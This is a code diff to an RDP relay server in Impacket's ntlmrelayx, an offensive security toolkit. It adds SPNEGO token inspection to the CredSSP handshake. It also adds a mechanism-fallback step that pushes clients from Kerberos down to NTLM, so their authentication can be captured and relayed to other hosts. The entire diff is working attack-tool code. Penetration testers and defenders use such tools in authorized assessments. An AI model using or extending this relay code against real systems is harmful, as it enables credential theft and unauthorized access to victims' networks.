@@ -31,6 +31,12 @@ from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.structure import Structure
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.rdp_ssl import ServerTLSContext, generate_self_signed_cert
+from impacket.examples.ntlmrelayx.utils.spnegoutils import (
+    NTLM_MECH,
+    build_ntlm_challenge_token,
+    build_ntlm_fallback_token,
+    find_embedded_spnego_token,
+)
 from impacket.examples.utils import get_address
 
 
@@ -169,6 +175,16 @@ class RDPRelayServer(Thread):
         def find_ntlmssp_in_data(data):
             return data.find(b"NTLMSSP\x00")
 
+        @staticmethod
+        def inspect_client_token(data, client_ip):
+            token_info = find_embedded_spnego_token(data)
+            if token_info is not None:
+                if token_info.negoex_offered:
+                    LOG.info("(RDP): NEGOEX authentication offered by client %s, currently not supported for relay" % client_ip)
+                if token_info.negoex_selected:
+                    LOG.info("(RDP): NEGOEX selected by client %s, currently not supported for relay" % client_ip)
+            return token_info
+
         def handle_credssp(self, client_socket, client_address):
             client_tls = None
             relay_client = None
@@ -212,6 +228,8 @@ class RDPRelayServer(Thread):
                 client_socket.settimeout(300)
                 challenge = None
                 negotiate_message = None
+                client_uses_spnego = False
+                ntlm_fallback_requested = False
 
                 while True:
                     try:
@@ -226,6 +244,20 @@ class RDPRelayServer(Thread):
 
                     if not data:
                         break
+
+                    token_info = self.inspect_client_token(data, client_address[0])
+                    if token_info is not None:
+                        client_uses_spnego = True
+                        if token_info.negoex_selected:
+                            return
+                        if token_info.is_init and (not token_info.mech_types or token_info.mech_types[0] != NTLM_MECH):
+                            if ntlm_fallback_requested:
+                                LOG.error("(RDP): Client did not continue with NTLM after mechanism fallback")
+                                return
+                            fallback = self.build_tsrequest_challenge(build_ntlm_fallback_token())
+                            client_tls.sendall(fallback)
+                            ntlm_fallback_requested = True
+                            continue
 
                     ntlm_offset = self.find_ntlmssp_in_data(data)
                     if ntlm_offset == -1:
@@ -280,7 +312,10 @@ class RDPRelayServer(Thread):
                             challenge_message['TargetInfoFields_len'] = len(av_pairs.getData())
                             challenge_message['TargetInfoFields_max_len'] = len(av_pairs.getData())
 
-                        challenge_response = self.build_tsrequest_challenge(challenge_message.getData())
+                        challenge_data = challenge_message.getData()
+                        if client_uses_spnego:
+                            challenge_data = build_ntlm_challenge_token(challenge_data)
+                        challenge_response = self.build_tsrequest_challenge(challenge_data)
                         client_tls.sendall(challenge_response)
 
                     elif message_type == 3:  # AUTHENTICATE
